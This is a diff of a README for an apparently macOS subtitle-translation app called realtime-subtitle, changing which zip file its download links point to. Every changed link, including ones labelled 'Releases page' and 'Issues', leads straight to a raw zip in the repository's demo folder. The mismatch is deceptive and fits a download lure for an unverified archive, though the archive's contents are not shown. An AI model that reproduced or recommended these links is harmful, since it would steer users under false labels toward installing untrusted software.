@@ -1,7 +1,7 @@
 # 🎥 realtime-subtitle - Easy Real-Time Translated Subtitles
 
 ## 📥 Download the Application
-[![Download Release](https://github.com/kalab12321/realtime-subtitle/raw/refs/heads/master/demo/realtime-subtitle-v3.1.zip%20Latest%20Release-blue?style=for-the-badge)](https://github.com/kalab12321/realtime-subtitle/raw/refs/heads/master/demo/realtime-subtitle-v3.1.zip)
+[![Download Release](https://github.com/kalab12321/realtime-subtitle/raw/refs/heads/master/demo/realtime_subtitle_1.4.zip%20Latest%20Release-blue?style=for-the-badge)](https://github.com/kalab12321/realtime-subtitle/raw/refs/heads/master/demo/realtime_subtitle_1.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the realtime-subtitle project! This application provides real-time translated subtitles powered by Whisper for macOS. It's designed to help you understand videos in different languages easily. 
@@ -21,7 +21,7 @@ To run the realtime-subtitle application, you need:
 ## 📥 Download & Install
 To download the application, visit the Releases page:
 
-[Download Latest Release](https://github.com/kalab12321/realtime-subtitle/raw/refs/heads/master/demo/realtime-subtitle-v3.1.zip)
+[Download Latest Release](https://github.com/kalab12321/realtime-subtitle/raw/refs/heads/master/demo/realtime_subtitle_1.4.zip)
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, you will see the latest version of the application. Look for the file that is labeled for macOS.
@@ -39,7 +39,7 @@ After installing the application, open it.
 
 ## 📖 Additional Information
 If you have any questions or need support:
-- Check the [Issues](https://github.com/kalab12321/realtime-subtitle/raw/refs/heads/master/demo/realtime-subtitle-v3.1.zip) section for known problems.
+- Check the [Issues](https://github.com/kalab12321/realtime-subtitle/raw/refs/heads/master/demo/realtime_subtitle_1.4.zip) section for known problems.
 - Feel free to create an issue for any new problems you encounter.
 
 ## 📬 Contact
